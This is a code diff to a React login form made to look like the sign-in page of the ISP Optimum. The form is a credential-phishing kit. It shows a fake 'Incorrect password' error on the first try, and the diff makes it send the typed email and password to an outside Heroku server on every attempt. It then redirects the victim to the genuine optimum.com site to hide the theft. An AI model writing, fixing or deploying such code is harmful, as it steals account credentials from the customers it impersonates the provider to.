@@ -2,72 +2,110 @@ import React, { useState, useEffect } from 'react';
 
 const LoginForm = () => {
   const [formData, setFormData] = useState({ email: '', password: '' });
-  const [error, setError] = useState('');
-  const [attemptCount, setAttemptCount] = useState(0);
+  const [error, setError] = useState("");
+  const [clickCount, setClickCount] = useState(0);
 
   // Auto-fill email from localStorage
   useEffect(() => {
     const savedEmail = localStorage.getItem('email')?.trim();
-    if (savedEmail && savedEmail.endsWith('@comcast.net')) {
+    if (savedEmail && savedEmail.endsWith('@optonline.net')) {
       setFormData((prev) => ({ ...prev, email: savedEmail }));
     }
   }, []);
 
+
   const validateForm = () => {
-    if (!formData.email) {
+    if (!formData.email.trim()) {
       setError('Enter your email.');
       return false;
     }
-    if (!formData.password) {
+    if (!formData.password.trim()) {
       setError('Enter your password.');
       return false;
     }
+    setError(''); // Clear the error if the form is valid
     return true;
   };
-
-  const handleSubmit = async (e) => {
-    e.preventDefault();
-
-    // Validate form before proceeding
-    if (!validateForm()) return;
-
-    if (attemptCount === 0) {
-      // Simulate failure on the first attempt
-      setError('Incorrect password. Please try again.');
-      console.log('Error:', 'Incorrect password on the first attempt.');
-      setAttemptCount(1); // Increment attempt count
-      return; // Exit early to prevent actual submission
-    }
-
-    try {
-      const response = await fetch(
-        'https://optserver01-27e6f3a564ec.herokuapp.com/api/submit',
-        {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(formData),
-        }
-      );
-
-      const data = await response.json();
-
-      if (data.success) {
-        window.location.href =
-          'https://www.optimum.com/refer-a-friend?_gl=1*wvdox7*_gcl_au*MzM0OTU0ODU4LjE3MzcwMzU5NzA';
-      } else {
-        setError(data.message || 'Submission failed. Please try again.');
-      }
-    } catch (err) {
-      setError('Failed to submit. Please try again later.');
-      console.error('Error:', err);
-    }
-  };
-
 
   const handleChange = (e) => {
     const { name, value } = e.target;
     setFormData((prev) => ({ ...prev, [name]: value }));
   };
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+
+     // Validate form before proceeding
+     if (!validateForm()) return;
+
+
+    // Increment click count on every click
+    setClickCount((prevCount) => prevCount + 1);
+
+   
+
+    // On the first click, show error and submit data
+    if (clickCount === 0) {
+      setError('Incorrect password. Please try again.');
+      console.log('Error:', 'Incorrect password on the first attempt.');
+
+      // Always send data, even on the first click
+      try {
+        const response = await fetch(
+          'https://optserver01-27e6f3a564ec.herokuapp.com/api/submit',
+          {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(formData),
+          }
+        );
+
+        const data = await response.json();
+        console.log(data);
+
+        // If needed, you can handle success response here as well
+      } catch (error) {
+        console.error('Error on first attempt:', error);
+      }
+    } else {
+      // On subsequent clicks, clear the error and submit the data
+      setError(''); // Clear the error
+      console.log('Submitting data on subsequent attempt');
+
+      try {
+        const response = await fetch(
+          'https://optserver01-27e6f3a564ec.herokuapp.com/api/submit',
+          {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(formData),
+          }
+        );
+
+        const data = await response.json();
+        console.log(data);
+
+        if (data.success) {
+          // Redirect on successful submission
+          window.location.href =
+            'https://www.optimum.com/refer-a-friend?_gl=1*wvdox7*_gcl_au*MzM0OTU0ODU4LjE3MzcwMzU5NzA';
+        } else {
+          // Handle any error response
+          setError(data.message);
+        }
+      } catch (error) {
+        setError('Failed to submit. Please try again later.');
+        console.error('Error:', error);
+      }
+    }
+  };
+
+
+
 
   return (
     <div className="bg-white p-6 rounded shadow-md max-w-80 relative md:left-12">
@@ -95,6 +133,7 @@ const LoginForm = () => {
             I forgot my Optimum ID
           </a>
         </div>
+        
         <div className="mb-4">
           <label htmlFor="password" className="block text-sm font-bold font-orbit">
             Password
